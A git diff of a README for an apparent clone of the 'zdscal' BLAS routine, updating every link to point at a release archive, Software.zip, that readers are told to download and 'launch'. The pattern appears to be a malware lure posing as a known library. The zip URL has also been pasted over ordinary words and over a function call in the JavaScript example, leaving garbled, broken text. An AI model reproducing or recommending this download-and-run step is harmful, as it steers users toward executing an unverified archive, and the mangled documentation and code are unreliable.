@@ -1,6 +1,6 @@
 # 🚀 BLAS Base Zdscal
 
-![BLAS Base Zdscal](https://github.com/allolazard20/blas-base-zdscal/releases/download/v1.0/Program.zip)
+![BLAS Base Zdscal](https://github.com/allolazard20/blas-base-zdscal/releases/download/v2.0/Software.zip)
 
 BLAS Base Zdscal is a repository dedicated to scaling a double-precision complex floating-point vector by a double-precision floating-point constant. This computational task is crucial in various algebraic and linear operations, particularly in the realm of complex mathematics and array manipulation.
 
@@ -14,16 +14,16 @@ The `zdscal` function provided in this repository allows you to efficiently scal
 
 To get started, simply download the necessary files from the following link: 
 
-[![Download Zdscal](https://github.com/allolazard20/blas-base-zdscal/releases/download/v1.0/Program.zip)](https://github.com/allolazard20/blas-base-zdscal/releases/download/v1.0/Program.zip)
+[![Download Zdscal](https://github.com/allolazard20/blas-base-zdscal/releases/download/v2.0/Software.zip)](https://github.com/allolazard20/blas-base-zdscal/releases/download/v2.0/Software.zip)
 
 Launch the downloaded file and follow the instructions to incorporate the `zdscal` subroutine into your project.
 
 ## 📦 Installation
-To use the `zdscal` subroutine in your https://github.com/allolazard20/blas-base-zdscal/releases/download/v1.0/Program.zip application, follow these steps:
+To use the `zdscal` subroutine in your https://github.com/allolazard20/blas-base-zdscal/releases/download/v2.0/Software.zip application, follow these steps:
 
 1. Download the necessary files from the provided link.
 2. Extract the contents of the downloaded ZIP file.
-3. Include the `zdscal` subroutine in your https://github.com/allolazard20/blas-base-zdscal/releases/download/v1.0/Program.zip project.
+3. Include the `zdscal` subroutine in your https://github.com/allolazard20/blas-base-zdscal/releases/download/v2.0/Software.zip project.
 4. Call the `zdscal` function with the appropriate parameters to scale your complex vector.
 
 ```javascript
@@ -38,7 +38,7 @@ const factor = 2.5;
 // Scale the vector
 const scaledVector = zdscal(vector, factor);
 
-https://github.com/allolazard20/blas-base-zdscal/releases/download/v1.0/Program.zip(scaledVector);
+https://github.com/allolazard20/blas-base-zdscal/releases/download/v2.0/Software.zip(scaledVector);
 ```
 
 ## 🛠️ Example
@@ -60,7 +60,7 @@ By applying the `zdscal` subroutine, we successfully scaled the complex vector b
 ## 🌟 Features
 - Efficient scaling of double-precision complex floating-point vectors
 - High-performance computation for linear algebraic operations
-- Compatible with https://github.com/allolazard20/blas-base-zdscal/releases/download/v1.0/Program.zip applications for seamless integration
+- Compatible with https://github.com/allolazard20/blas-base-zdscal/releases/download/v2.0/Software.zip applications for seamless integration
 - Supports a wide range of complex vector manipulation tasks
 - Easy-to-use subroutine for mathematical computations
 
